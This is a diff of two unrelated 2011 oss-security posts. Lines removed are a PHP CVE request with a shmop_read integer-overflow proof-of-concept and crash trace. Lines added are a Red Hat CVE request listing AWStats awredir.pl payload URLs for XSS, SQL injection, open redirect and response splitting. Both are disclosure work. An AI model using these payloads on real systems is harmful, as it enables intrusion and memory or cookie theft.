@@ -1,198 +1,55 @@
 X-Archive-Source: openwall-scrape
-X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2011/03/08/9
-Message-ID: <AANLkTim+=vBiidJMaiQDXVRwAv0pn7BjoABQA-FvX4y4@mail.gmail.com>
-Date: Tue, 8 Mar 2011 14:36:49 +0100
-From: Pierre Joye <pierre.php@...il.com>
-To: oss-security@...ts.openwall.com
-Subject: CVE request, php's shm
+X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2011/10/07/1
+Message-ID: <4E8EB58B.4090704@redhat.com>
+Date: Fri, 07 Oct 2011 10:17:15 +0200
+From: Jan Lieskovsky <jlieskov@...hat.com>
+To: "Steven M. Christey" <coley@...us.mitre.org>
+CC: oss-security@...ts.openwall.com, MustLive <mustlive@...security.com.ua>
+Subject: CVE Request -- Multiple security issues in various versions of AWStats
 Content-Type: text/plain; charset=utf-8
 
-hi,
+Hello Josh, Steve, vendors,
 
-Can someone request a CVE for this flaw please? It would rock if we
-can get it today as we will package 5.3.6 final.
+   these doesn't look like CVE ids have been already assigned for:
+   [1] https://bugzilla.redhat.com/show_bug.cgi?id=740926#c0
+   [2] http://secunia.com/advisories/46160/
+   [3] http://seclists.org/fulldisclosure/2011/Sep/234
+   [4] http://websecurity.com.ua/5380/
 
-This flaw has been discovered by Jose Carlos Norte, already fixed in
-SVN by Felipe Pena (felipe@....net), see
-http://svn.php.net/viewvc/?view=revision&revision=309018
+If I counted correctly, six CVE ids should be assigned for these
+(since different versions are listed as vulnerable):
 
-Thanks for your work!
+1) XSS (WASC-08) (in versions <=1.1):
+    http://site/awredir.pl?url=javascript:alert(document.cookie)
 
-Cheers,
----------- Forwarded message ----------
-From: Jose Carlos Norte <jose@...os.org>
-Date: Tue, Mar 8, 2011 at 10:06 AM
-Subject: Re: about a memory error in php
-To: Scott MacVicar <scott@...vicar.net>
-Cc: security@....net
+2) Redirector (URL Redirector Abuse in WASC 2.0) (WASC-38):
+    http://site/awredir.pl?url=http://websecurity.com.ua
 
+3) SQL Injection (WASC-19): (version 1.2)
+    http://site/awredir.pl?url='%20and%20benchmark(10000,md5(now()))/*
 
-Hi,
+4) XSS (WASC-08) (in version 1.2):
 
-thanks for your fast reply! following your instructions, I communicate
-the bug directly in this mail:
+    http://site/awredir.pl?url=%3Cscript%3Ealert(document.cookie)%3C
+    /script%3E
 
-the problem is in the shmop_read php function, in the file
-ext/shmop/shmop.c. This functions reads a given number of bytes from
-memory, at a given offset starting from a shared memory area.
+    http://site/awredir.pl?key=%3Cscript%3Ealert(document.cookie)%3C
+    /script%3E
 
-string shmop_read (int shmid, int start, int count)
+5) HTTP Response Splitting (WASC-25):
 
-Inside the code of the function itself, there are checks in the start
-parameter and in the count parameter, to avoid reading arbitrary
-memory outside the shared memory object:
+    http://site/awredir.pl?key=04ed5362e853c72ca275818a7c0c5857&
+    url=%0AHeader:1
 
-    if (start < 0 || start > shmop->size) {
-        php_error_docref(NULL TSRMLS_CC, E_WARNING, "start is out of range");
-        RETURN_FALSE;
-    }
+6) CRLF Injection (Improper Input Handling in WASC 2.0) (WASC-20):
 
-    if (start + count > shmop->size || count < 0) {
-        php_error_docref(NULL TSRMLS_CC, E_WARNING, "count is out of range");
-        RETURN_FALSE;
-    }
+    http://site/awredir.pl?key=4b9faa91e2529400c4f3c70833b4e4a5&
+    url=%0AText
 
-The first block check if start is lower than 0 or bigger than the size
-of the shared memory area.
+Could you allocate CVE identifiers for these? (let me know
+if further description of each of the issues is necessary prior
+assignment).
 
-The second block checks that the SUM (ADDITION) of "start" and "count"
-is not greater than the shared memory area, and later checks if count
-its not lower than 0.
-
-The problem is that both variables are signed longs, in 32 bits
-architectures this means 2^31 maximum value, after this value, the
-variable becomes negative.
-
-So, if we put exactly 2^31 as a value in count, and 1 as a value in
-start, the first condition: start + count would become negative
-(2^31+1) and will pass the check, and the second condition (count > 0)
-will also pass the check, because count its positive (2^31) and do not
-get negative until the addition of 1.
-
-After this, the code follows:
-
-
-
-    startaddr = shmop->addr + start;
-    bytes = count ? count : shmop->size - start;
-
-    return_string = emalloc(bytes+1);
-    memcpy(return_string, startaddr, bytes);
-    return_string[bytes] = 0;
-
-    RETURN_STRINGL(return_string, bytes, 0);
-
-bytes is again a signed integer.
-
-return_string allocates 2^31+1+1 (+1 from start, +1 directly hardcoded
-in the emalloc call) bytes, this is negative inside bytes, but its not
-a problem, since emalloc uses size_t, so 2^31+1+1 of memory is
-allocated.
-
-After this, there is a call to memcpy, that will exactly copy 2^31+1+1
-bytes of memory inside return_string, far far larger than the shared
-object memory area.
-
-So, in normal situations, this will produce a segmentation fault,
-because of php reading past its own memory.
-
-However, this could be exploitable in scenarios with enough memory,
-because return_string is returned to the php, if there is enough
-allocated memory to not produce a segmentation fault, 2gb of arbitrary
-memory would be leaked.
-
-I have created a little exploit to test the issue:
-
-<?php
-$shm_key = ftok(__FILE__, 't');
-$shm_id = shmop_open($shm_key, "c", 0644, 100);
-$shm_data = shmop_read($shm_id, 1, 2147483647);
-//if there is no segmentation fault past this point, we have 2gb of memory!
-echo $shm_data;
-?>
-
-In this exploit, I use 1 as a value for start, and 2^31 (2147483647) as count.
-
-2147483647+1 = -2147483647.
-
-When executing it:
-
-n00b@...natos:~$ cat lol.php
-<?php
-$shm_key = ftok(__FILE__, 't');
-$shm_id = shmop_open($shm_key, "c", 0644, 100);
-$shm_data = shmop_read($shm_id, 1, 2147483647);
-//if there is no segmentation fault past this point, we have 2gb of memory!
-echo $shm_data;
-?>
-n00b@...natos:~$ php lol.php
-Segmentation fault
-n00b@...natos:~$
-
-A call to ltrace, reveals:
-
-malloc(2147745792)
-
-     = 0x35cbd008
-memcpy(0x35cbd024, "", 2147483647 <unfinished ...>
---- SIGSEGV (Segmentation fault) ---
-+++ killed by SIGSEGV +++
-n00b@...natos:~$
-
-it is the memcpy, trying to read past the memory assigned to php that
-is crashing the application.
-
-If you need any further details, please do not hesitate to ask.
-
-Thanks for your time and your fast response.
-
-Regards,
-
-On Mon, 7 Mar 2011 16:10:21 -0800, Scott MacVicar <scott@...vicar.net> wrote:
-
-You reply to the list, we'll analyse it fix and ask for a CVE to
-represent it. We don't publish to any lists and will fix it as soon as
-we can. Credit are published in the changelog.
-
-- Scott
-
-On 7 March 2011 15:21, Jose Carlos Norte <jose@...os.org> wrote:
->
-> Hi,
->
-> I'm a security enthusiast who likes to audit open source projects
-> source code, I have been working this weekend reading the PHP source
-> code (a really great piece of software) and I have found for the
-> moment 1 vulnerability regarding to memory management, I'm not sure it
-> is exploitable, but at this moment I'm able to create a php file that
-> segfaults the php binary, trying to read/write on incorrect memory
-> adresses.
->
-> I would like to know what are the normal procedure in the php project
-> to proceed with the advisory, regarding to:
->
-> - credits?
-> - timings?
-> - waiting times?
->
-> In fact what I would like to know mostly is what is the most
-> reponsible procedure for me, to allow you to solve the issue, before
-> publishing anything.
->
-> As a security researcher, I would like to publish my findings at least
-> in my blog, and I also want to know if is PHP security team who send
-> the advisory to securityfocus, or the researcher.
->
-> I really want to proceed in the most ethical and polite way with your
-> project and your community.
->
-> Regars,
->
-> Jose Carlos Norte.
-
-
-
--- 
-Pierre
-
-@pierrejoye | http://blog.thepimp.net | http://www.libgd.org
+Thank you && Regards, Jan.
+--
+Jan iankko Lieskovsky / Red Hat Security Response Team
